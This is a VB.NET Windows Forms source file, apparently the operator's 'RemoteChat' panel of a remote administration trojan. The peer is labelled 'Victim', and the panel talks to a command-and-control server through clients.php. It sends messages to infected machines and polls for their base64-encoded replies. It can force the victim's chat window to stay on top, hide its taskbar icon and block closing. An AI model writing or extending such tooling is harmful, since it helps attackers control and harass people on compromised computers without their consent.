Imports System.ComponentModel
Imports System.Net
Imports System.Net.Mail
Imports System.Text

Public Class RemoteChat
    Public targetIp As String = ""
    Public sessionId As String = ""
    Dim chatFluxThread As New Threading.Thread(Sub() chatFluxManage())

    Private Sub remotechat_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Text = "Remote Chat @ " & targetIp
        chatFluxThread.Start()
    End Sub

    Private Sub RemoteChat_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        chatFluxThread.Abort()
        'Todo: close window victim side
    End Sub

    Private Sub messageTB_TextChanged(sender As Object, e As EventArgs) Handles messageTB.TextChanged
        sendButton.Enabled = messageTB.Text.Trim <> ""
    End Sub

    Private Sub addChatMessage(message As String, Optional isAdmin As Boolean = False)
        chatWindow.SelectionColor = Color.Black : chatWindow.SelectedText = "("

        If isAdmin Then
            chatWindow.SelectionColor = Color.Blue : chatWindow.SelectedText = "You"
        Else
            chatWindow.SelectionColor = Color.Green : chatWindow.SelectedText = "Victim"
        End If

        chatWindow.SelectionColor = Color.Black : chatWindow.SelectedText = ") >> " & message & vbCrLf

        chatWindow.ScrollToCaret()
        chatWindow.Refresh()
    End Sub

    Private Sub sendButtonClickSub()
        Dim showInTaskBar = "0", alwaysOnTop = "1", allowCloseChat = "0"

        If allowCloseChatCB.Checked Then allowCloseChat = "1"
        If showIconCB.Checked Then showInTaskBar = "1"
        If topMostCB.Checked Then alwaysOnTop = "1"

        Dim sendMessageQuery = New WebClient().DownloadString(My.Settings.vpsurl &
                             "clients.php?action=adminsend&target=" & targetIp &
                             "&actioncontent=" & showInTaskBar &
                             "&actioncontent2=" & alwaysOnTop &
                             "&actioncontent3=" & allowCloseChat &
                             "&actioncontent4=" & messageTB.Text)

        addChatMessage(messageTB.Text, True)
        messageTB.Clear()
    End Sub

    Private Sub sendButton_Click(sender As Object, e As EventArgs) Handles sendButton.Click
        sendButtonClickSub()
    End Sub


    Private Sub chatFluxManage()
        Dim lastMessageReceived As String = ""

        While True
            Dim receiveMessageQuery = New WebClient().DownloadString(My.Settings.vpsurl &
                             "clients.php?action=adminreceive&target=" & targetIp)

            If receiveMessageQuery = lastMessageReceived Then
                GoTo EndOfTreatement
            Else
                lastMessageReceived = receiveMessageQuery
            End If

            If receiveMessageQuery.Trim = "" Then
                GoTo EndOfTreatement
            End If

            Dim parsedMessage As String() = receiveMessageQuery.Split("|")
            'MESSAGE BASE64|RANDOMSTRING
            '   MsgBox("parsed: " & parsedMessage(0))
            Dim decodedMsg As String = Encoding.UTF8.GetString(Convert.FromBase64String(parsedMessage(0)))
            addChatMessage(decodedMsg)

EndOfTreatement:
            Threading.Thread.Sleep(200)
        End While
    End Sub

    Private Sub messageTB_KeyDown(sender As Object, e As KeyEventArgs) Handles messageTB.KeyDown
        If e.KeyCode = Keys.Enter Then
            e.SuppressKeyPress = True
            sendButtonClickSub()
        End If
    End Sub

    Private Sub chatWindow_TextChanged(sender As Object, e As EventArgs) Handles chatWindow.TextChanged

    End Sub

    Private Sub RemoteChat_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Dim client As New Net.WebClient()
        MsgBox("Now closing")
        client.DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=closeremotechat")
    End Sub
End Class